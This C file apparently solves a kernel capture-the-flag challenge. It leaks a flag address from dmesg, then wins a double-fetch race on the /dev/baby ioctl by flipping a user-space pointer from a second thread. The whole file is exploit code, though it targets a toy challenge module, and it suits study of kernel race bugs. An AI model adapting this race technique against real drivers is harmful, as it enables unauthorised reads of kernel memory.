#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>
#include <stdbool.h>
#define DEV_NAME "/dev/baby"
void debug(){
	puts("Press any key to continue:");
    getchar();
}
int fd;
typedef struct _ioctl_data{
	char* flag_addr;
	uint32_t length;
}ioctl_data;

void init()
{
	fd = open(DEV_NAME, O_RDWR);
	if (fd < 0)
		exit(-1);
	puts("[*] init done!");
}
void errExit(const char* msg)
{
	puts(msg);
	exit(-1);
}
uint64_t get_real_flag_addr(){
	
	ioctl(fd,0x6666);
	system("mkdir -p tmp");
	system("dmesg > /tmp/klog");
	int fd = open("/tmp/klog",O_RDWR);
	if(fd==-1){
		errExit("Open klog fails");
	}
	char buf[0x1000];
	lseek(fd,-0x1000,SEEK_END);
	read(fd,buf,0x1000);
	char* pos = strstr(buf,"Your flag is at "); 
	if(pos == 0 ){
		errExit("Flag addr not found");
	}else{
		pos = pos + strlen("Your flag is at ");
		return strtoull(pos,NULL,16);
	}
	return 0;
}
bool finish = false;
uint64_t real_flag_addr;
void* change_flag_addr(void *data){
	ioctl_data* d = (ioctl_data*)data;	
	while(finish == false){
		d->flag_addr = (char*)real_flag_addr;	
	}
	return NULL;
}
const char* FLAG = "flag{aaaaaaaaaaaaaaaaaaaaaaaaaaa}";
int main(int argc, char const *argv[]){
	init();
	real_flag_addr = get_real_flag_addr();
	printf("Real flag addr is : 0x%lx\n",real_flag_addr);
	ioctl_data data;
	data.length = 33;
	pthread_t evil;
	pthread_create(&evil,NULL,change_flag_addr,(void*)&data);
	for(int i = 0 ;i<0x1000;i++){
		data.flag_addr = (char*)FLAG;
		ioctl(fd,0x1337,&data);
	}
	finish = true;	
	pthread_join(evil,NULL);
	close(fd);
	puts("flag is :");
	system("dmesg | grep flag");
	return 0;	
}

